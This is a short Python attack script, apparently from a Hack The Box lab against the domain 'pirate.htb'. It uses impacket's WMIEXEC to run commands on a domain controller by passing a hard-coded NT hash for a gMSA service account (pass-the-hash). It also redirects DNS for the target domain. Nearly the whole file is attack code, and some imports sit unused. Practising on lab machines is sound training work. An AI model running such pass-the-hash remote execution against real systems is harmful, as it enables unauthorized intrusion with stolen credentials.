#!/usr/bin/env python3
"""Run commands via WinRM using impacket's winrm-like approach"""
import sys
sys.path.insert(0, r"C:\Users\90898\.pyenv\pyenv-win\versions\3.8.10\Scripts")
sys.path.insert(0, r"C:\Users\90898\.pyenv\pyenv-win\versions\3.8.10\Lib\site-packages")

import hashlib, socket

DC_IP = "10.129.8.87"
# Monkey-patch DNS
_orig = socket.getaddrinfo
def _p(host, port, *a, **kw):
    if isinstance(host, str) and "pirate.htb" in host.lower():
        host = DC_IP
    return _orig(host, port, *a, **kw)
socket.getaddrinfo = _p

# Use impacket wmiexec
from impacket.examples.wmiexec import WMIEXEC

HASH = "8126756fb2e69697bfcb04816e685839"
USER = "gMSA_ADFS_prod$"
DOMAIN = "pirate.htb"

cmd = sys.argv[1] if len(sys.argv) > 1 else "whoami"

from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
import io, contextlib

# Use wmiexec
try:
    wmiexec = WMIEXEC(cmd, USER, DOMAIN, "", "", lmhash="", nthash=HASH,
                      doKerberos=False, aesKey="", kdcHost=None,
                      shell_type='cmd', silentCommand=True)
    wmiexec.dcom = DCOMConnection(DC_IP, USER, "", DOMAIN, "", HASH,
                                   oxidResolver=True, doKerberos=False)
    print("Connected")
except Exception as e:
    print(f"Error: {e}")
    import traceback
    traceback.print_exc()
